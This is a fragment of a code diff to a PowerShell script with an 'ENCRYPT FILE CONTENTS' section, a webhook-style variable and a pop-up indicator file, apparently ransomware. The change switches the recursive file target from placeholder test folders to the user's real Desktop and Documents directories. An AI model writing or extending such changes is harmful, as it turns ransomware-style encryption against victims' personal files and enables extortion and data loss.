@@ -37,7 +37,7 @@ Clear-Host
 # ENCRYPT FILE CONTENTS
 # Define setup variables
 $whuri = "$dc"
-$SourceFolder = ".\folder",".\folder2"
+$SourceFolder = "$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents"
 $files = Get-ChildItem -Path $SourceFolder -File -Recurse
 
 # Generate the indcator file (for pop-up close detection)
